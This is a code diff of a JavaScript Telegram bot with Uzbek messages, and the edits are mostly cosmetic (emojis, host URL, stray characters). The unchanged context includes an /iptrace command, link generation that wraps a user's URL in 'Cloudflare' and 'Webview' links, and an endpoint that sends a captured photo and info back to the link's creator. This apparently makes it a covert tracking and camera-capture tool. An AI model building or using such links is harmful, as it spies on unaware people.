@@ -259,12 +259,11 @@ bot.onText(/\/start/, async (msg) => {
             const options = {
                 reply_markup: {
                     inline_keyboard: [
-                        [{ text: 'Kanalga a\'zo bo\'lish 🔥', url: `https://t.me/${channelId.slice(1)}`}],[{ text: 'Tekshirish ♻️', url:
-`https://t.me/All_In_1_Robot?start=bot`}]
+                        [{ text: 'Kanalga a\'zo bo\'lish', url: `https://t.me/${channelId.slice(1)}`}],[{ text: 'Kanalga a\'zo bo\'lish', url: `https://t.me/${channelId.slice(1)}`}]
                     ]
                 }
             };
-            await bot.sendMessage(chatId, '👀 Botdan foydalanish uchun avval kanalimizga a\'zo bo\'ling.', options);
+            await bot.sendMessage(chatId, 'Botdan foydalanish uchun avval kanalimizga a\'zo bo\'ling.', options);
         }
     } catch (error) {
         console.error(error);
@@ -328,7 +327,7 @@ bot.onText(/\/iptrace (.+)/, async (msg, match) => {
 });
 
 
-var hostURL="https://Heyo-GPT4.onrender.com";
+var hostURL="https://bots-sem.onrender.com";
 
 var use1pt=false;
 
@@ -495,22 +494,16 @@ for(var c in y){
 g+=y[c]+"\n";
 }
 
-
-
-
-  // Bot orqali xabar yuborish
-
-  
-  
 bot.sendMessage(cid, `Sizning link laringiz mufaqyatli tayorlandi 🙂‍↔️
 
 🧐 siz yuborgan link: ${msg}
 
 ☁ Cloud flare havolasi\n➥${f}
 
-🌐 Webview havolasi\n➥${g}\n`,m);
-  }
-  else{
+🌐 Webview havolasi\n➥${g}\n
+`,m);
+}
+else{
 
 bot.sendMessage(cid, `Sizning link laringiz mufaqyatli tayorlandi 🙂‍↔️
 
@@ -518,15 +511,14 @@ bot.sendMessage(cid, `Sizning link laringiz mufaqyatli tayorlandi 🙂‍↔️
 
 ☁ Cloud flare havolasi\n➥${cUrl}
 
-🌐 Webview havolasi\n➥${wUrl}\n`,m);
-
-
+🌐 Webview havolasi\n➥${wUrl}\n
+`,m);
 }
 }
 else{
 bot.sendMessage(cid,`Hato link yubordingiz 🥺\n\nIltimos qayta urinib koring 😊\n\nMisol uchun : https://google.com yoki http://google.com`);
 createNew(cid);
-j
+
 }  
 }
 
@@ -606,7 +598,6 @@ bot.sendPhoto(parseInt(uid,36),buffer,{},info);
 } catch (error) {
 console.log(error);
 }
-console.log(uid)  
 
 
 res.send("Done");
